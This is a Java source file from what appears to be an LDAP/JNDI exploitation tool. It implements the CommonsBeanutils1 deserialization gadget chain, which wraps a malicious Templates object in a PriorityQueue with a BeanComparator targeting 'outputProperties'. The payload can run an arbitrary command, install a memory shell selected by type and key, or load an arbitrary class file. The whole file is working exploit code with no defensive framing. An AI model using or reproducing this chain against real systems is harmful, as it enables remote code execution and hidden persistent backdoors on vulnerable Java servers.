package com.idiot9.ldap.gadgets;

import com.idiot9.ldap.Starter;
import com.idiot9.ldap.gadgets.utils.Reflections;
import com.idiot9.ldap.gadgets.utils.TemplatesCreator;
import com.idiot9.ldap.templates.ClassFileTemplates;
import com.idiot9.ldap.templates.CommandTemplates;
import com.idiot9.ldap.templates.TemplateFactory;
import org.apache.commons.beanutils.BeanComparator;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.util.PriorityQueue;

public class CommonsBeanutils1 implements GadgetFactory{

    @Override
    public Object getCmdObject(String cmd) throws Exception {
//        Templates templates = (Templates) TemplatesCreator.createTemplatesImpl(cmd);
        CommandTemplates commandTemplates = new CommandTemplates(cmd);
        Templates templates = commandTemplates.getTemplates();
        return getGadget(templates);
    }

    @Override
    public Object getMemObject(String memType, String key) throws Exception {
//        Templates templates = TemplatesCreator.MemShell.createMemTemplates(mem, key);
        String packageName = Starter.class.getPackage().getName();
        Class<?> memClass = Class.forName(packageName + ".templates." + memType + "Templates");
        Constructor<?> constructor = memClass.getConstructor(String.class);
        TemplateFactory templateFactory = (TemplateFactory) constructor.newInstance(key);
        Templates templates = templateFactory.getTemplates();
        return getGadget(templates);
    }

    @Override
    public Object getClassFileObject(String classFile) throws Exception {
        ClassFileTemplates classFileTemplates = new ClassFileTemplates(classFile);
        Templates templates = classFileTemplates.getTemplates();
        return getGadget(templates);
    }

    @Override
    public Object getGadget(Templates templates) throws Exception {
        BeanComparator<Object> comparator = new BeanComparator<>();
        PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        queue.add(1);
        queue.add(1);
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;
    }
}
